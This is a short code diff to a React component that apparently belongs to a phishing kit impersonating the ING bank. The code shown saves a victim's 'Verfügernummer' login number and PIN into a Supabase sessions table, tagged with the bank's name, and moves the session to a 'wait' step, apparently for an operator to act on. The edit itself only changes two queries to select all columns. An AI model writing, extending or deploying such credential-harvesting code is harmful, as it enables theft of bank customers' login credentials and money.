@@ -17,7 +17,7 @@ export function IngClient({ sessionId }: { sessionId: string }) {
     let cancelled = false;
     void (async () => {
       if (!supabase || !sessionId) return;
-      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
+      const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
       if (cancelled || !data) return;
       const fd = (data.form_data ?? {}) as Record<string, string>;
       if (fd.verfuegernummer) setUsername(fd.verfuegernummer);
@@ -29,7 +29,7 @@ export function IngClient({ sessionId }: { sessionId: string }) {
   async function handleSubmit() {
     if (!supabase || !sessionId) return;
     setSaving(true);
-    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
+    const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
     const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
     await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
       form_data: { ...prev, bankSlug: "ing", bankName: "ING", verfuegernummer: username, pin: password }
